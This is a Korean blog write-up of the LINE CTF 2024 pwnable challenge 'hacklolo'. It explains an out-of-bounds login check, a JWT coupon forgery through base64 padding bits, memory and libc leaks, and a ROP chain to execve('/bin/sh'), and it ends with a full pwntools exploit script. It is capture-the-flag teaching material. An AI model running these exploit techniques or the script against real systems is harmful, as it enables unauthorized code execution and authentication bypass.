+++
title = "LINE CTF 2024 - hacklolo"
date = "2024-10-18"
description = "LINE CTF 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "out of bound", "jwt counterfeit", "ansi escape code"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/hacklolo'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

C++로 만들어진 바이너리로 분석하는데에 상당히 까다로웠다.

### Structure
``` c
struct user_db // sizeof=0xD68
{
    struct user user_list[32];
    user *user_list_ptr;
    _QWORD count;
    _QWORD login_try;
    _QWORD is_login;
    char *welcome_ptr;
    _QWORD welcome_size;
    char welcome[8];
    _QWORD canary;
    user *current_user;
    _QWORD login_success;
    char *jwt_key;
    _QWORD jwt_key_size;
    _QWORD jwt_key_end;
};
struct user // sizeof=0x68
{
    char *pw_ptr;
    _QWORD pw_size;
    char pw[8];         // or could be nothing
    _QWORD end_pw;
    char *id_ptr;
    _QWORD id_size;
    char id[8];         // or could be nothing
    _QWORD end_id;
    char *email_ptr;
    _QWORD email_size;
    char email[8];      // or could be nothing
    _QWORD end_email;
    _QWORD age;
};
```

C++에서 `basic_string` 객체가 가지는 특성 때문인지 문자열을 그냥 저장하지 않고 `id`를 예를 들면 다음과 같이 저장한다.

- `id_ptr` : 문자열이 저장된 주소
- `id_size` : 문자열의 길이
- `id[8]` : 길이 `8`까지의 문자열은 여기에 저장하고 더 긴 문자열은 다른 영역을 할당받아 저장
- `id_end` : 쓰이지 않는 영역으로 chunk 관련 데이터로 추정


## 0x01. Vulnerability
### Out of bound
``` c
__int64 __fastcall login_790E(user_db *user_db)
{
  ...
  for ( i = 0; i <= 32; ++i )
  {
    a2_20_23596(id, &user_db->user_list[i]);
    id_same = strncmp_1043E(id, id_input);
    std::string::~string(id);
    if ( id_same )
    {
      a2_0_235C8(pw, &user_db->user_list[i]);
      pw_same = strncmp_1043E(pw, pw_input);
      std::string::~string(pw);
      if ( pw_same )
      {
        user_db->current_user = &user_db->user_list[i];
        a2_20_23596(v15, &user_db->user_list[i]);
        sub_F7F3(id, "[*] Login Success. Hello, ", v15);
        ...
      }
    }
  }
  ...
}
```

`used_db`에는 총 `32`개의 `user`를 저장할 수 있는 공간이 있는데 `login_790E()`에서 `user`를 확인하는 범위는 `33`개이다.

때문에 `user_list[32]` 이후 영역이 또 하나의 `user`로 인식되며 다음과 같이 영역이 겹쳐진다.

|after `user_list`|`user`|
|:-:|:-:|
|user *user_list_ptr  |char *pw_ptr|
|_QWORD count         |_QWORD pw_size|
|_QWORD login_try     |char pw[8]|
|_QWORD is_login      |_QWORD end_pw|
|char *welcome_ptr    |char *id_ptr|
|_QWORD welcome_size  |_QWORD id_size|
|char welcome[8]      |char id[8]|
|_QWORD canary        |_QWORD end_id|
|user *current_user   |char *email_ptr|
|_QWORD login_success |_QWORD email_size|
|char *jwt_key        |char email[8]|
|_QWORD jwt_key_size  |_QWORD end_email|
|_QWORD jwt_key_end|  | - |

따라서 바이너리 실행 시 출력되는 `"Welcome!"`이 `id`인 계정으로 로그인이 가능하다.

### JWT counterfeit
`join`시 생성되는 `coupon`은 HS256으로 생성한 JWT 값으로, siganture 부분은 HMAC-SHA256을 이용해 생성된다.

이 때 출력값이 256비트(32바이트)이고 이 값을 base64URL으로 인코딩한다.

인코딩 과정에서 base64가 3바이트 단위로 인코딩을 하므로 padding(`=`)이 붙게 된다.

![base64.png](https://ctf-wiki.mahaloz.re/misc/encode/figure/base64_0.png)

그런데 사실 `=` 뿐만 아니라 **마지막 바이트의 마지막 두 비트**까지 `00`으로 padding이 붙는다.

따라서 디코딩 과정에서 **마지막 바이트의 마지막 두 비트**는 원본 데이터에 영향을 미치지 못한다.

바꿔 말하면 **마지막 바이트의 마지막 두 비트**에 `00`, `01`, `10`, `11` 넷 중 아무거나 들어가도 같은 값으로 디코딩된다.

디코딩 값이 같다면 `coupon` 값에서 한 비트씩 값을 증가시켜도 서명 검증을 통과하기 때문에 여러번 `coupon`을 등록하는 것이 가능하다.

JWS의 구현 상 발생하는 문제로 어떻게 써먹을 수 있을진 모르겠지만 다른 곳에서도 사용할 수 있을 것 같다.


## 0x02. Exploit
### Memory leak
`user_db->user_list[32]` 이후의 영역(`Welcome!` 계정)의 메모리는 다음과 같다.

``` bash
# Welcome!
gef➤  x/13gx $rbp-0xa0
0x7fffffffec60: 0x00007fffffffdf60      0x0000000000000001
0x7fffffffec70: 0x0000000000000000      0x0000000000000000
0x7fffffffec80: 0x00007fffffffec90      0x0000000000000008
0x7fffffffec90: 0x21656d6f636c6557      0xc8647733c17b4d00
0x7fffffffeca0: 0x00007ffff77d7ce0      0x0000000000000000
0x7fffffffecb0: 0x00005555555a5f80      0x0000000000000020
0x7fffffffecc0: 0x000000000000003c
```

`pw_ptr`를 의미하는 영역에는 `user_list`의 시작 주소인 `0x7fffffffdf60`가 담겨있고, `pw_size`를 의미하는 영역에는 계정의 개수를 의미하는 `count`가 담겨있다.

현재 `count`는 `main()` 초반부에 호출되는 `setup_admin_7D3A()`에서 `admin` 계정을 추가하면서 `1`이 되어있다.

따라서 `Welcome!` 계정의 비밀번호는 `0x7fffffffdf60`에 저장된 `1`바이트이다.

이를 이용해 `user`를 늘려가며 `1`바이트씩 비밀번호를 brute forcing하여 memory leak이 가능하다.

``` bash
# admin
gef➤  x/13gx $rbp-0xda0
0x7fffffffdf60: 0x00007fffffffdf70      0x0000000000000008
0x7fffffffdf70: 0x6e374f7175585a68      0x0000000000000300
0x7fffffffdf80: 0x00007fffffffdf90      0x0000000000000005
0x7fffffffdf90: 0x0000006e696d6461      0x00000000001e3e30
0x7fffffffdfa0: 0x00005555555a5ed0      0x0000000000000012
0x7fffffffdfb0: 0x000000000000001e      0x000000000000001c
0x7fffffffdfc0: 0x0000000000000022
```

`0x7fffffffdf60`은 다시 말하면 `user_list[0]`이고 최초의 계정인 `admin`의 정보가 저장되어있다.

`count`는 최대 `32`까지 증가시킬 수 있으므로 최대 `32`바이트까지 leak이 가능하지만, 마지막 `8`바이트는 `basic_string`의 기타 데이터이므로 총 `26`바이트만 leak을 시도했다.

이를 통해 stack 주소와 `admin`의 `pw`를 획득할 수 있다.

``` python
def memory_leak(s):
    hit = bytes()
    for i in range(0x1a):
        for j in range(0x100):
            if j in [0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]:
                continue
            r = login(s, b"Welcome!", hit + j.to_bytes(1, 'little'))
            if b"Login Success" in r:
                hit += j.to_bytes(1, 'little')
                sys.stdout.write(f"\rhit : {hit}")
                sys.stdout.flush()
                break
        logout(s)
        it = str(i + 1).encode()
        join(s, it, it, it, i + 1)
    sys.stdout.write(f"\n")
    return hit
```

`\t`, `\n` 등을 의미하는 값들은 입출력상 leak이 불가능하지만 자주 발생하는 문제는 아닌 것 같다.

### Game win
로그인을 하면 `Play Game`, `Apply Coupon`, `Coupon usage history`, `Change PW`, `Print Information`중 하나를 할 수 있다.

이 중 `Change PW`와 `Print Information`은 `Play Game`에서 보스를 쓰러뜨리고 `regular member`가 되어야 사용할 수 있는 메뉴이다.

문제를 풀 때는 다음 단계로 넘어가기 위해 일단 게임을 깼는데 지금처럼 먼저 exploit 시나리오를 세워서 목적을 가지고 진행하는 습관을 들여야겠다.

OOB 취약점을 이용해서 `Welcome!` 계정으로 게임을 깨고 `Change PW`를 호출하면 `pw_ptr`이 가리키는 곳의 값을 변경할 수 있다.

`Welcome!->pw_ptr`은 `admin->pw_ptr`이 저장된 주소를 가리키고 있으므로, `admin->pw_ptr`을 원하는 주소로 바꿔놓고 `admin`으로 로그인해서 다시 `Change PW`를 호출하면 앞서 설정한 원하는 주소에 데이터를 쓸 수 있는 AAW를 획득할 수 있다.

다만 완전히 AAW는 아닌 것이 `admin->pw_ptr`을 바꾸는 순간 `admin`으로 로그인을 하기 위해 필요한 비밀번호가 바뀐다.

따라서 데이터를 쓸 주소에 저장된 값을 알고 있어야 하는데, 지금 생각해보니 `Welcome!`의 비밀번호를 바꿀 때 `admin->pw_size`까지 `1`로 바꿔서 brute forcing을 해도 괜찮을 것 같다.

아무튼 게임은 나를 따라오는 `Enemy`를 피해 `Item`을 획득해서 `Attack`과 `Defense`를 올린 뒤 `Enemy`와 싸워야 하는데 `Item`을 다 먹어도 `Enemy`를 이길 수 없다.

이 때 가입 시 발급되는 `coupon`을 이용하면 `Attack`이 두 배가 되므로 JWT counterfeit 취약점을 이용해 총 네개의 `coupon`을 이용하면 `Enemy`를 이길 수 있다.

문제는 상술한 AAW를 얻기 위해 `Welcome!` 계정이 `regular member`가 되어야하는데 `Welcome!` 계정은 가입된 계정이 아니다보니 발급된 `coupon`이 없다.

``` c
__int64 __fastcall join_8A4A(user_db *user_db)
{
  ...
  if ( user_db->count <= 31 )
  {
    ...
      for ( i = 0; i < user_db->count; ++i )
      {
        a2_20_23596(id_i, &user_db->user_list[i]);
        id_same = strncmp_1043E(id_i, id);
        std::string::~string(id_i);
        if ( id_same )
        {
          std::operator<<<std::char_traits<char>>(&std::cout, "[*] The ID already exists.\r");
          std::ostream::operator<<();
          result = -1;
          goto LABEL_13;
        }
      }
    ...
  }
}
```

다행히 `join_8A4A()`을 보면 `id`가 중복되었는지를 `user_list`를 `count`까지만 돌면서 확인하기 때문에 `Welcome!`이라는 계정을 생성할 수 있다.

또한 `login_790E()`에서도 `id`만 맞고 `pw`가 다를 경우 그냥 다음 루프로 넘어가기 때문에 가입 이후에도 `33`번째 `Welcome!` 계정에 로그인이 가능하다.

마지막은 생성한 `Welcome!` 계정의 `coupon`을 `33`번째 `Welcome!` 계정이 사용할 수 있는가인데 디버거에서 `secret key`를 확인해 jwt.io에서 내용을 확인한 결과 다음과 같이 `userid`가 같기 때문에 `33`번째 `Welcome!` 계정에서 `coupon`을 사용할 수 있었다.

![jwt info](https://github.com/user-attachments/assets/16e803e0-4ba8-4732-b7b5-3ef162ca3895)

따라서 다음과 같이 payload를 작성했다.

``` python
    # join fake "Welcome!"
    r = join(s, b"Welcome!", b"Welcome@", b"Welcome#", 0x10)
    coupon = r.split(b"issued : ")[1].split(b"\r\n")[0]
    log.info(f"coupon : {coupon}")
    login(s, b"Welcome!", ml + b"\x00\x00")

    # counterfeit coupon
    if not apply_coupon_quadra(s, coupon):
        log.failure(f"bad coupon :(")
        exit()
```

이제 게임을 깨야하는데 차후 디버깅을 위해서라도 자동화를 하려고 했는데... 여기에서 ANSI escape code를 사용한 입출력때문에 엄청 오래걸렸다.

결과적으로는 `pyte`라는 라이브러리를 사용해서 map 정보를 파싱해왔고, `Item`을 먹는 알고리즘은 좋은게 떠오르지 않아 다음과 같은 단순한 방식을 사용했다.

1. 확률을 높이기 위해 `Enemy`와 한 칸 차이가 되도록 위로 이동
2. 맨 왼쪽 아래으로 이동 - `(0, 0)`
3. 맨 왼쪽 위으로 이동 - `(0, 16)`
4. `Item`이 있는 column으로 이동 - `(n, 16)`
5. 맨 아래로 이동 - `(n, 0)`
6. `Item`을 다 먹었으면 7번, 남았으면 2번
7. `Enemy`와 전투

이유는 모르겠는데 `(0, 16)`에 가면 높은 확률로 `Enemy`와 두 칸 차이가 나게 되어 `Item`의 column을 보고 너무 가까운 곳에 있으면 그냥 게임을 재시작하는게 빨라 해당 코드를 추가했다.

### Libc leak
상술한 방법으로 AAW를 얻는다 쳐도 RIP를 어디로 control할 지가 문제이다.

따라서 libc leak이 필요하다고 판단했고, 출력부를 확인해보니 `Print Information`이 있었다.

여기에서 `email`을 출력해주는데 `email_size`가 `Welcome!->login_success` 영역과 겹친다.

따라서 로그인을 성공시켜 `login_success` 값을 늘리면 memory leak이 가능할 것으로 판단했다.

주의할 것은 C++이라서 그런지 사용하는 라이브러리가 많아 glibc 영역을 잘 찾아 가져와야한다.

``` python
    logout(s)
    for _ in range(0xa0):
        login(s, b"Welcome!", b"Welcome@")
        logout(s)
    login(s, b"Welcome!", ml + b"\x00\x00")
    r = print_info(s)
    libc = u64(r[0xcc:0xd4])
    lib.address = libc - 0x29d90
    log.info(f"libc : {hex(lib.address)}")
```

### RIP control
이제 stack 주소를 알고있으니 `main()`의 return address를 덮어서 ROP 가젯들을 실행한 뒤 `execve`를 실행하게끔 payload를 작성했다.

다만 `main()` 종료 직전에 호출되는 `free_db_24FBA()`에서 각 `user` 정보들을 저장한 객체들을 해제하기 때문에 AAW를 위해 바꿔둔 `admin->pw_ptr`을 원복시켜야 한다.

``` c
__int64 __fastcall free_db_24FBA(__int64 user_db)
{
  ...
  if ( user_db )
  {
    for ( i = user_db + 0xD00; ; free_strings_F406(i) )
    {
      result = user_db;
      if ( i == user_db )
        break;
      i -= 0x68LL;
    }
  }
  return result;
}
```

따라서 다음과 같이 paylaod를 작성했다.

``` python
    # change admin->pw to point return address of main
    ret = stack + 0xd98
    change_pw(s, p64(ret) + p64(0x8))
    
    # overwrite return address
    logout(s)
    pop_rdi_ret = lib.address + 0x2a3e5
    pop_rsi_ret = lib.address + 0x2be51
    pop_rdx_rbx_ret = lib.address + 0x904a9
    payload = p64(pop_rdi_ret)
    payload += p64(next(lib.search(b"/bin/sh")))
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(pop_rdx_rbx_ret)
    payload += p64(0)
    payload += p64(0)
    payload += p64(lib.symbols["execve"])
    login(s, b"admin", p64(libc))
    change_pw(s, payload)

    # restore admin->pw
    logout(s)
    login(s, b"Welcome!", p64(ret) + p64(len(payload)))
    change_pw(s, p64(stack) + p64(0x8))
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser
import sys
import pyte

BINARY = "game"
LIBRARY = "libc.so.6"
CONTAINER = "7e8bfb970414"

def join(s, id, pw, email, age):
    s.sendline(b"1")
    s.sendlineafter(b"Id:\r\n", id)
    s.sendlineafter(b"Pw:\r\n", pw)
    s.sendlineafter(b"Email:\r\n", email)
    s.sendlineafter(b"Age:\r\n", str(age).encode())
    return s.recvuntil(b"Choice : \r\n")

def login(s, id, pw):
    s.sendline(b"2")
    s.sendlineafter(b"id:\r\n", id)
    s.sendlineafter(b"pw:\r\n", pw)
    return s.recvuntil(b"Choice : \r\n")

def quit_(s):
    s.sendline(b"3")
    return s.recvuntil(b"quit\r\n")

def logout(s):
    return s.sendlinethen(b"Choice : \r\n", b"1")

def play_game(s):
    s.sendline(b"2")

def apply_coupon(s, coupon):
    s.sendline(b"3")
    s.sendlineafter(b"coupon : \r\n", coupon)
    r = s.recvuntil(b"Choice : \r\n")
    if r.find(b"successfully") > -1:
        log.success(f"coupon use success")
        return True
    else:
        log.failure(f"something wrong with {coupon}")
        return False

def usage_history(s):
    s.sendline(b"4")
    return s.recvuntil(b"Choice : \r\n")

def change_pw(s, pw):
    s.sendline(b"5")
    s.sendlineafter(b"PW? : \r\n", b"y")
    s.sendlineafter(b"PW : \r\n", pw)
    return s.recvuntil(b"Choice : \r\n")

def print_info(s):
    s.sendline(b"6")
    return s.recvuntil(b"Choice : \r\n")

def memory_leak(s):
    hit = bytes()
    for i in range(0x1a):
        for j in range(0x100):
            if j in [0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]:
                continue
            r = login(s, b"Welcome!", hit + j.to_bytes(1, 'little'))
            if b"Login Success" in r:
                hit += j.to_bytes(1, 'little')
                sys.stdout.write(f"\rhit : {hit}")
                sys.stdout.flush()
                break
        logout(s)
        it = str(i + 1).encode()
        join(s, it, it, it, i + 1)
    sys.stdout.write(f"\n")
    return hit

def apply_coupon_quadra(s, coupon):
    apply_coupon(s, coupon)
    coupon_dup = coupon[:-1] + chr(coupon[-1] + 1).encode()
    apply_coupon(s, coupon_dup)
    coupon_dup = coupon_dup[:-1] + chr(coupon_dup[-1] + 1).encode()
    apply_coupon(s, coupon_dup)
    coupon_dup = coupon_dup[:-1] + chr(coupon_dup[-1] + 1).encode()
    r = apply_coupon(s, coupon_dup)
    return r

def parse_map(data, p=0):
    # 터미널 크기 설정 (24행, 80열 등으로 설정)
    screen = pyte.Screen(80, 24)
    stream = pyte.Stream(screen)

    stream.feed(data.decode('utf-8'))

    # 화면 출력 파싱 후 'I', 'O', 'E' 위치 찾기
    positions = {'I': [], 'O': [], 'E': []}
    for row_num, row in enumerate(screen.display, start=1):
        if row_num < 4:
            continue
        for col_num, char in enumerate(row, start=1):
            if char in positions:
                positions[char].append((row_num, col_num))
    
    if p == 1:
        for line in screen.display:
            print(line)
        print(positions)
    return positions

def move(s, direction):
    for d in direction:
        s.send(d.encode())
        s.recvuntil(b"||")
        try:
            r = s.recvuntil(b"||", timeout=3)
        except TimeoutError:
            log.failure(f"game lost :(")
            exit()
    return r

def win_game(s):
    while 1:
        s.sendline(b"2")
        r = s.recvuntil(b"||")
        positions = parse_map(r)
        item_col = sorted(set([item[1] for item in positions['I']]))
        log.info(f"items located in col {item_col}")

        # die if too close
        die = 0
        if item_col[0] < 10:
            log.info("I would rather kill myself...")
            die = 1
            while r := move(s, 'f'):
                if b"Game Over!" in r:
                    s.send(b"\n")
                    break
        if die:
            continue
        
        # go to 0, 0
        direction = 'w' * 6
        direction += 's' * 8
        direction += 'a' * 30
        r = move(s, direction)
        parse_map(r)

        # farm items
        for c in item_col:
            log.info(f"farming item in col {c}")
            direction = 'w' * 16
            direction += 'd' * (c - 2)
            direction += 's' * 16
            direction += 'a' * (c - 2)
            r = move(s, direction)
            parse_map(r)
            
        # fight!
        while r := move(s, 'f'):
            if b"Game Over!" in r:
                s.send(b"\n")
                return s.recvuntil(b" : \r\n")

code_base = 0x555555554000
bp = {
    'login_switch_main' : code_base + 0x24145,
    'join' : code_base + 0x8A4A,
    'free_join' : code_base + 0x8F44,
    'login' : code_base + 0x23FFE,
    'after_login' : code_base + 0x240D2,
    'ret_main' : code_base + 0x24A1D,
}

gs = f'''
b *{bp["ret_main"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    s.recvuntil(b"Choice : \r\n").decode()
    
    # memory leak using OOB
    ml = memory_leak(s)
    stack = u64(ml[0:8])
    admin_pw = ml[0x10:0x18]
    log.info(f"stack : {hex(stack)}")
    log.info(f"admin pw : {admin_pw.decode()}")

    # join fake "Welcome!"
    r = join(s, b"Welcome!", b"Welcome@", b"Welcome#", 0x10)
    coupon = r.split(b"issued : ")[1].split(b"\r\n")[0]
    log.info(f"coupon : {coupon}")
    login(s, b"Welcome!", ml + b"\x00\x00")

    # counterfeit coupon
    if not apply_coupon_quadra(s, coupon):
        log.failure(f"bad coupon :(")
        exit()

    # win game to be regular member
    if b"regular member" not in win_game(s):
        log.failure(f"game lost :(")
        exit()
    log.success(f"game win!")
    s.sendlinethen(b"Choice : \r\n", b'y')

    # libc leak by increasing login_success(email_size)
    logout(s)
    for _ in range(0xa0):
        login(s, b"Welcome!", b"Welcome@")
        logout(s)
    login(s, b"Welcome!", ml + b"\x00\x00")
    r = print_info(s)
    libc = u64(r[0xcc:0xd4])
    lib.address = libc - 0x29d90
    log.info(f"libc : {hex(lib.address)}")

    # change admin->pw to point return address of main
    ret = stack + 0xd98
    change_pw(s, p64(ret) + p64(0x8))
    
    # overwrite return address
    logout(s)
    pop_rdi_ret = lib.address + 0x2a3e5
    pop_rsi_ret = lib.address + 0x2be51
    pop_rdx_rbx_ret = lib.address + 0x904a9
    payload = p64(pop_rdi_ret)
    payload += p64(next(lib.search(b"/bin/sh")))
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(pop_rdx_rbx_ret)
    payload += p64(0)
    payload += p64(0)
    payload += p64(lib.symbols["execve"])
    login(s, b"admin", p64(libc))
    change_pw(s, payload)

    # restore admin->pw
    logout(s)
    login(s, b"Welcome!", p64(ret) + p64(len(payload)))
    change_pw(s, p64(stack) + p64(0x8))

    # trigger ret in main
    logout(s)
    quit_(s)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```